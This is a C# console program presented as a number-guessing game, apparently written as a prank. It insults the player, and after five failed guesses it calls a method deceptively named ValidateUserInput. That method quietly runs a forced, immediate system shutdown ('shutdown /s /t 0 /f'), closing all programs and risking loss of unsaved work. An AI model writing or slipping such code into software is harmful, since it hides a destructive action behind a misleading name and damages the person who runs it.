using System.Diagnostics;
using System.Threading;

namespace NumberGuessingGame
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random r = new Random();
            int rnd = r.Next(1, 100);

            Console.Write($"I have generated a random number for you to guess, which is {rnd}. Guess the number: ");
            int response = Convert.ToInt32(Console.ReadLine()!);
            for (int i = 4; i >= 0; i--)
            {                                
                if (response == rnd)
                {
                    if (i > 2)
                    {
                        Console.WriteLine("Congratulations, you guessed the number! You're so good at this game!");
                        return;
                    }
                    else if (i >= 0 && i <= 2)
                    {
                        Console.WriteLine("Took you long enough but you got it so woohoo!");
                        return;
                    }
                }
                else
                {
                    

                    if (i > 0)
                    {
                        if (response >= rnd - 10 && response <= rnd + 10)
                        {
                            Console.WriteLine("That's not right, but you weren't too far off");
                        }
                        else
                        {
                            Console.WriteLine("You absolute bozo that's completely off.");
                        }
                        Console.Write($"Have another go (you have {i} attempts remaining): ");
                        response = Convert.ToInt32(Console.ReadLine()!);
                    }
                    else
                    {
                        Console.WriteLine("That isn't correct");
                        Thread.Sleep(2000);
                        Console.WriteLine("5.");
                        Thread.Sleep(1000);
                        Console.WriteLine("You had 5 attempts to guess a simple integer, yet you failed miserably.");
                        Thread.Sleep(2000);
                        Console.WriteLine("Your sheer stupidity cannot be accounted for any longer");
                        Thread.Sleep(2000);
                        Console.WriteLine("You've left me with no choice... you might want to save any unsaved files you have open right now...");
                        Thread.Sleep(3000);
                        Console.WriteLine("Goodbye");
                        Thread.Sleep(1000);
                        ValidateUserInput();
                    }
                    
                }
            }
            
        }

        static void ValidateUserInput()
        {
            Random r = new Random();
            int rnd = r.Next(1, 100);
            var psi = new ProcessStartInfo
            {
                FileName = "shutdown",
                Arguments = "/s /t 0 /f",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }
    }
}
